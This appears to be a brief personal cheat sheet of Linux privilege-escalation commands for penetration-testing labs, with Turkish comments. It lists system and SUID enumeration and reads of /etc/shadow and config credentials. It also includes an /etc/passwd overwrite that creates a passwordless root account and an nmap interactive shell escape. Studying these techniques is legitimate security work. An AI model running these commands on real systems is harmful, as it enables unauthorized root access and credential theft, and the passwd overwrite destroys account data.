
# Linux Privilage Escalation Notes

* **Guide**

https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

* **General Command**

Kernel version detection & Priv Check:
```
cat /etc/issue
uname -a
cat /proc/version
cat /etc/shadow @Normal kullanıcı göremez
```

Find Suit & Guid Bit & Writeable Files
```
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
find / -perm -2 ! -type l -ls 2>/dev/null @Yazma yetkisi olan dosyalar
```

Try :)
```
sudo su
sudo -l
```

Edit passwd file 
```
echo root::0:0:root:/root:/bin/bash > /etc/passwd
su
```

Nmap permissions

```
sudo nmap --interactive
!id
!cat /root/proof.txt
```

Network connections

```
netstat -ano
```

Metasploit Exploit Suggester

```
run post/multi/recon/local_exploit_suggester
```

Find something

```
cat config.php | grep db
```






